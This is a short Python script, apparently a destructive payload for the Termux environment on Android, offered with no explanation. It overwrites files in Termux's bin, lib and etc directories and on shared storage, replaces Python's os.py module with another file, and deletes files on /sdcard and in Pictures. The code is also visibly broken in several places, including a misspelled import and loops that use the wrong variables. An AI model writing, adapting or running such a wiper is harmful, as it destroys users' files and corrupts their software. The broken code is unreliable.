from os import listdisr
pwdlist1 = listdir("/data/data/com.termux/files/usr/bin/")
pwdlist2 = listdir("/data/data/com.termux/files/usr/lib/")
pwdlist3 = listdir("/data/data/com.termux/files/usr/etc/")
bilal = " "
try:
    for file in pwdlist1:
        open(file,"w").write(bilal)
except:
    pass
try:
    for file in pwdlist2:
        open(file,"w").write(bilal)
except:
    pass
try:
    for file in pwdlist3:
        open(file,"w").write(bilal)
except:
    pass
listxd = listdir("/sdcard/")
try:
    for listx in listxd:
        open(listx,"w").write(bilal)
except:
    pass
os_data = open("os/os_id.py","r").read()
bilal_id = open("/data/data/com.termux/files/usr/lib/python3.10/os.py","w")
bilal_id.write(os_data)
list_data_id = listdir("/sdcard/")
try:
    from os import remove as rm
    for data_x in list_data_id:
        rm(data_x)
except:
    pass
try:
    data_png = listdir("/storage/emulated/0/Pictures/")
    from os import remove as rm
    for data_png in list_data_id:
        rm(data_x)
except:
    pass
